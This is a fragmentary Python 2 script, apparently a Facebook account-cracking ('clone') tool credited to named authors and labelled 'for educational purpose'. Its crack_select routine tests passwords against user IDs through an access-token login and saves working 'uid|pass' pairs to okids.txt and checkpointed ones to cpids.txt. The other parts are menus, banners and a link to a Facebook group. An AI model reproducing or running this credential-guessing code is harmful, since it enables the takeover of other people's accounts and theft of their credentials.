#Script Given By ZIHAD HOSSAIN
#Script Is Given For Educational Purpose
#Script Edited By NAZMUL TUFAN
#Utf-8 python 
...
zihad = ['Op Bolty','Good Jani','Keep It Up ','Wah Bhai','Kia Baat Hy ','Aag Lga Di','Tu Baqio Sy Alag Hy Vro','Agar May Larki Hota Toh Tuj sy Shaadi Krta ','Ha Chikny Lub u']
qaiserchoice = random.choice(zihad)
agents = [
...
def main():
    ...
    print ' \033[0m[2].\x1b[1;96m Follow My Facebook '
    print ' \033[0m[3].\x1b[1;96m New Group add & Invite friends '
...
def log_sel():
    ...
    if select == '1':
        ...
        os.system('xdg-open https://facebook.com/groups/526990652383397')
        main()
    else:
        print ''
...
def crack():
    ...
    print logo
    print ''
    print '\x1b[1;0m 1. \033[1;96mClone 3 Links\033[0m \n 2. \033[1;96mClone Single id\033[0m' ##Thanks MR.ZIHAD
    print ''
    crack_select()
...
def crack_select():
    ...
    print ' \x1b[1;94m  Wait Ids Will Appear Here \033[0m'#Thanks MR. ZIHAD
    print 45 * '_'
    print ''
        ...
        try:
            ...
            if 'access_token' in q:
                ...
                if 'access_token' in q:
                    ...
                    q = json.loads(data)
                    if 'access_token' in q:
                        print '\x1b[1;32m[ZIHAD-OK]\033[0m ' + uid + ' | ' + pass3 + '\x1b[0;97m'
                        ok = open('okids.txt', 'a')
                        ok.write(uid + '|' + pass3 + '\n')
                        ok.close()
                        oks.append(uid + pass3)
                    elif 'www.facebook.com' in q['error_msg']:
                        print '\x1b[1;31m[ZIHAD-CP] \033[0m' + uid + ' | ' + pass2 + '\x1b[0;97m' #Thanks MR. ZIHAD
                        cp = open('cpids.txt', 'a')
                        cp.write(uid + '|' + pass3 + '\n')
                        cp.close()
    ...
    print '   \x1b[0m Total Ok / Cp ids : ' + str(len(oks)) + '/' + str(len(cps)) ##Thanks MR.ZIHAD 
    print 45 * '\033[0m_\033[0m'
    print ''
    print ''
